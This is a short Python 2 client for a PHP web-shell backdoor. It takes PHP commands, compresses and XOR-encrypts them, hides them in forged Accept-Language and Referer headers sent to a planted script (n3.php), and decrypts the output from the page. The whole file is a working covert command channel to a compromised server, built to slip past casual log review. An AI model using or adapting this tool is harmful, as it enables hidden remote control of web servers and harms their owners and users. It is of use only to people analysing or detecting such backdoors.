import requests
import zlib
import hashlib
import base64

url = 'http://127.0.0.1/n3.php'
k1 = 'd6a6'
k2 = 'bc0d'



def main():
    global k1,k2,url
    print 'Please input PHP commond:'
    while 1:
        cmd = raw_input()
        Accept,kh,kf = mkAccept(k1,k2)
        Ref = mkRef(cmd,kh,kf)
        CryptRes = sendPayload(url,Accept,Ref)
        Res = DeCrypt(k1,k2,CryptRes)


def mkAccept(k1,k2):
    ac = 'abb-c;q=0.0,ABB-C;q=0.0,dee-f;q=0.1'
    i = 'aA'
    kh = hashlib.md5( i+k1 ).hexdigest()[0:3]
    kf = hashlib.md5( i+k2 ).hexdigest()[0:3]
    return ac,kh,kf

def mkRef(cmd,kh,kf):
    ref = 'http://www.abc.com/index.php?'
    ref = ref + 'aa=' + kh + '&'
    ref = ref + 'bb=' + mkPayload(cmd) + kf
    return ref

def mkPayload(cmd):
    global k1,k2
    key = k1 + k2
    payload = zlib.compress(cmd)
    payload = func_x(payload,key)
    payload = base64.b64encode(payload)
    payload = payload.replace('/','_').replace('+','-')
    return payload

def func_x(p,key):
    l = len(p)
    c = len(key)
    res = ''
    i = 0
    j = 0
    while i < l:
        j = 0
        while j<c and i<l:
            res += chr( ord(p[i]) ^ ord(key[j]) )
            j += 1
            i += 1
    return res

def sendPayload(url,Acc,Ref):
    head = {}
    head['Accept-Language'] = Acc
    head['Referer'] = Ref
    res = requests.get(url,headers=head)
    html = res.text
    return html

def DeCrypt(k1,k2,html):
    key = k1 + k2
    p1 = html.find(key+'>') + len(key) + 1
    p2 = html.find('</'+key, p1)
    res = html[p1:p2]
    res = base64.b64decode(res)
    res = func_x(res,k1+k2)
    res = zlib.decompress(res)
    print res


main()
